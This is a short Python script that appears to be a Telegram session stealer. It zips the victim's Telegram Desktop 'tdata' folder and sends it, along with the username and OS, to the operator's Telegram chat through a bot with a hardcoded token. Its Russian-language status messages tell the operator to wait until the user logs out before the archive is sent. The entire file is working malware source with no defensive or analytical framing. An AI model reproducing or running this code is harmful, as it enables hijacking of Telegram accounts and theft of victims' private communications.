import os, telebot, platform, requests
from zipfile import ZipFile

BOT_TOKEN = '8867347926:AAG3fETvnsLnAxwDksGwELVtt6W7pA7wiBY'
MY_ID = 8506343165

bot = telebot.TeleBot(BOT_TOKEN)

telegram_folder = os.path.join(os.path.expanduser("~"), 'AppData', 'Roaming', 'Telegram Desktop UWP', 'tdata')
telegram_zip = os.path.join(os.path.expanduser("~"), 'tdata.zip')

bot.send_message(MY_ID, f"🔔 Скрипт успешно запущен!\n💾 Имя пользователя: {os.getlogin()}\n🪑 Операционная система: {platform.system()} {platform.release()}")

telegram_online = True
message_sent = False

while telegram_online:
    try:
        f1 = os.listdir(telegram_folder)
        files = [os.path.join(telegram_folder, f) for f in f1]

        with ZipFile(telegram_zip, 'w') as z:
            for f in files:
                if os.path.isdir(f):
                    for root, dirs, files2 in os.walk(f):
                        for file in files2:
                            z.write(os.path.join(root, file))
                else:
                    z.write(f)

        bot.send_message(MY_ID, f"🟢🔓 Пользователь вышел из Telegram Desktop. Высылаем вам архивный файл с tdata ниже.")
        try:
            bot.send_document(MY_ID, open(telegram_zip, 'rb'))
            os.remove(telegram_zip)
            break
        except Exception as e:
            bot.send_message(MY_ID, f"🟠 Не удалось отправить архив {telegram_zip}. Ошибка: {e}")
            pass
        telegram_online = False
    except Exception as e:
        print(e)
        if not telegram_online:
            break
        if not message_sent:
            bot.send_message(MY_ID, f"🔴🔒 Пользователь находится онлайн через Telegram Desktop. Мы пока не можем отправить вам файл, пожалуйста, подождите, пока он выйдет из приложения.")
            message_sent = True
        pass
